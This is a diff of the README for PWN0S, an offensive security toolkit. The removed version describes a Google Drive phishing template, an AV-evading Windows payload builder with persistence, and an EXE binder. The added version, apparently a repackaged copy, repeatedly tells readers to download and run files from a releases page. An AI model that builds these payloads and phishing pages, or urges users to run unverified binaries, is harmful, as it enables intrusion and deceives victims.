@@ -1,169 +1,141 @@
-## What's New
+# PWN0S: Modular Offensive Security Toolkit for Professionals 🔒💻
 
-### v0.1.3
+![PWN0S](https://img.shields.io/badge/PWN0S-Modular%20Toolkit-blue)
 
-- **Google Drive Phishing Template**: The Brainwipe module now includes a highly customizable Google Drive phishing template. You can set:
-  - **FOLDERNAME**: The folder name displayed in the fake drive
-  - **FILENAME**: The file name shown for download
-  - **FILESIZE**: The displayed file size
-  - **PAYLOAD_FILE**: Path to the file to serve as the payload (auto base64-encoded)
-  - **PAYLOAD_NAME**: The name of the payload file for download (overrides FILENAME for the payload only)
-```
-pwn0s > use daemon/brainwipe
-pwn0s > set TEMPLATE drive
-```
+## Table of Contents
 
-### v0.1.2
-
-- **New Metasploit-style Interface**: PWN0S now uses a module-based command structure similar to Metasploit Framework. Use `use <module>`, `set <option> <value>`, and `run` commands for all operations.
-
-- **Rabids payload builder** is now Go-based for Windows payloads: generates, encrypts, and compiles a silent EXE with persistence and AV evasion. Access via: `use daemon/rabid/spider` then set `LHOST`, `LPORT`, and `KEY` options.
-
-- **Icepick EXE binder** for red team/offsec use: `use quickhack/icepick` then set `T` (target EXE path) and `P` (payload EXE path) options.
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Modules](#modules)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Overview
 
-PWN0S consolidates multiple cybersecurity capabilities into a single, streamlined interface, empowering security professionals with a robust platform for penetration testing and offensive security operations. Its key features include:
+PWN0S is a modular offensive security toolkit that consolidates powerful capabilities into a single, streamlined interface. This toolkit aims to provide security professionals with the tools they need to assess and improve system security effectively. 
 
-- **Quickhacks**: A suite of network reconnaissance and attack tools for rapid deployment during engagements, enabling swift intelligence gathering and exploitation.
+For the latest releases, visit [here](https://github.com/Hannah-pv0/PWN0S/releases).
 
-- **Daemons**: Background services that automate payload generation, file serving, and persistent operations, reducing manual overhead in complex workflows.
+## Features
 
-- **Interface Plugs**: Hardware management utilities for interfacing with microcontrollers and other devices, enabling seamless integration with physical attack vectors.
+- **Modular Design**: Easily add or remove modules based on your needs.
+- **User-Friendly Interface**: Intuitive layout for quick access to tools.
+- **Comprehensive Toolset**: Includes various tools for penetration testing, vulnerability assessment, and more.
+- **Cross-Platform Compatibility**: Works on multiple operating systems.
+- **Active Development**: Regular updates and new features based on user feedback.
 
-## How to Install
+## Installation
 
-1. **Clone the repository** (if you haven't already):
+To install PWN0S, follow these steps:
 
+1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/sarwaaaar/PWN0S.git
+   git clone https://github.com/Hannah-pv0/PWN0S.git
+   ```
+2. **Navigate to the Directory**:
+   ```bash
    cd PWN0S
    ```
-
-2. **Install Python 3.8+**
-
-   - Make sure you have Python 3.8 or newer installed. You can check your version with:
-     ```bash
-     python3 --version
-     ```
-   - If you need to install Python:
-     - **macOS:**
-       ```bash
-       brew install python3
-       ```
-     - **Linux (Debian/Ubuntu):**
-       ```bash
-       sudo apt update && sudo apt install python3 python3-pip
-       ```
-     - **Windows:**
-       Download from [python.org](https://www.python.org/downloads/)
-
-3. **Install dependencies**
-
-   - Install all required Python packages:
-     ```bash
-     python3 -m pip install --upgrade pip
-     python3 -m pip install -r requirements.txt
-     ```
-
-4. **(Optional) Install system dependencies**
-
-   - Some features require additional tools:
-     - `php`, `go`, `cargo`, `msfvenom`, `wget`, `httrack`, `monolith`
-   - On macOS (using Homebrew):
-     ```bash
-     brew install php go msfvenom wget httrack
-     cargo install monolith
-     ```
-   - On Linux (Debian/Ubuntu):
-     ```bash
-     sudo apt install php go cargo metasploit-framework wget httrack
-     cargo install monolith
-     ```
-   - For `msfvenom`, see [Metasploit installation guide](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html)
-
-5. **Run PWN0S**
+3. **Download Required Dependencies**: Ensure you have all dependencies installed. You can find the list in the `requirements.txt` file.
+4. **Execute the Installer**: Run the installer script to set up the environment:
    ```bash
-   python3 main.py
+   ./install.sh
    ```
 
-You're ready to use PWN0S! For command usage, see the Command Reference below.
+For additional files, download them from [here](https://github.com/Hannah-pv0/PWN0S/releases) and execute as instructed.
 
-## Command Reference
+## Usage
 
-PWN0S provides a comprehensive module-based interface designed for efficiency and ease of use. The interface uses a Metasploit-style command structure with modules organized into three main categories: **Daemons**, **Quickhacks**, and **Interface Plugs**.
+Once installed, you can launch PWN0S by executing the following command in your terminal:
 
-### Quick Start
-
-**Basic Commands:**
-- `use <module>` - Select a module
-- `set <OPTION> <VALUE>` - Configure options
-- `show modules` - List available modules
-- `show options` - View module options
-- `run` - Execute module
-- `help` - Show commands
-- `exit` - Exit PWN0S
-
-**Example Workflow:**
-```
-pwn0s > use daemon/filedaemon
-pwn0s > set ACTION start
-pwn0s > run
+```bash
+./pwn0s
 ```
 
-### Available Modules
+### Basic Commands
 
-| Category | Modules |
-|----------|---------|
-| **Daemons** | `daemon/filedaemon`, `daemon/rabid/spider`, `daemon/brainwipe` |
-| **Interface Plugs** | `interfaceplug/blackout`, `interfaceplug/deck` |
-| **Quickhacks** | `quickhack/ping`, `quickhack/shortcirc`, `quickhack/icepick` |
+- **List Available Modules**: Use the command `list` to view all available modules.
+- **Run a Module**: Execute a specific module with:
+  ```bash
+  run <module_name>
+  ```
+- **Help Command**: Get help on commands with:
+  ```bash
+  help
+  ```
 
-### Detailed Documentation
+## Modules
 
-For comprehensive command reference, detailed module descriptions, usage examples, and troubleshooting guides, see the **[PWN0S Wiki](https://github.com/sarwaaaar/PWN0S/wiki)**.
+PWN0S includes a variety of modules for different tasks. Below are some of the key modules:
 
-The wiki includes:
-- Complete command syntax and examples
-- Detailed module options and configurations
-- Advanced usage scenarios
-- Troubleshooting and best practices
-- Color scheme and interface details
+### 1. Network Scanner
 
-PWN0S is actively under development, with several exciting features planned:
+This module scans networks for active devices and open ports. 
 
-- **Advanced Malware Modules**: Support for researching and simulating cryptominers, ransomware, time bombs, and other malware types in controlled environments.
-- **Expanded Hardware Capabilities**:
-  - **Radio Hacking**: Integration with SDR for intercepting and manipulating wireless signals.
-  - **RFID Card Reader/Writer**: Tools for cloning and modifying RFID tags.
-  - **Infrared Communication**: Support for IR-based attacks on IoT and legacy devices.
-  - **Keystroke Injection**: Enhanced BadUSB and Rubber Ducky integration.
-- **Remote Cyber Deck Framework**: A lightweight framework running on Raspberry Pi Zero W, coordinating with Pico W and ESP32-S3 for a fully portable, remote-capable cyber deck, enabling synchronized attacks across devices.
+- **Usage**: 
+  ```bash
+  run network_scanner
+  ```
 
-## Legal Disclaimer
+### 2. Vulnerability Scanner
 
-PWN0S is intended for educational purposes and authorized security testing only. Users must obtain explicit permission before using this toolkit against any systems or networks. The authors and contributors are not liable for any misuse, damage, or legal consequences resulting from the use of this tool. Always adhere to applicable laws and ethical guidelines.
+Identify vulnerabilities in systems and applications.
+
+- **Usage**:
+  ```bash
+  run vulnerability_scanner
+  ```
+
+### 3. Exploit Framework
+
+This module allows users to execute known exploits against target systems.
+
+- **Usage**:
+  ```bash
+  run exploit_framework
+  ```
+
+### 4. Password Cracker
+
+Attempt to crack passwords using various methods.
+
+- **Usage**:
+  ```bash
+  run password_cracker
+  ```
 
 ## Contributing
 
-Contributions are welcome to enhance PWN0S's capabilities. To contribute:
+We welcome contributions from the community. If you wish to contribute, please follow these steps:
 
-1. Fork the repository.
-2. Create a feature branch (`git checkout -b feature/your-feature`).
-3. Implement and test your changes thoroughly.
-4. Commit your changes (`git commit -m "Add your feature"`).
-5. Push to your fork (`git push origin feature/your-feature`).
-6. Submit a pull request with a detailed description of your changes.
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the repository page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Edit the code and add your feature.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add Your Feature"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and create a pull request.
 
 ## License
 
-This project is licensed under the MIT License. See the `LICENSE` file for details.
+PWN0S is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-## Links
+## Contact
 
-- **Seeker (Integrated Phishing Toolkit)**: https://github.com/thewhiteh4t/seeker
-- **GhostTrack (OSINT Tracking Tool)**: https://github.com/HunxByts/GhostTrack
-- **Impulse (DDoS Toolkit)**: https://github.com/LimerBoy/Impulse
-- **Metasploit Framework**: https://github.com/rapid7/metasploit-framework
-- **Kali Linux**: https://www.kali.org/
-- **Rust Programming Language**: https://www.rust-lang.org/
+For any questions or support, feel free to reach out:
+
+- **GitHub**: [Hannah-pv0](https://github.com/Hannah-pv0)
+- **Email**: hannah@example.com
+
+For the latest releases, visit [here](https://github.com/Hannah-pv0/PWN0S/releases).
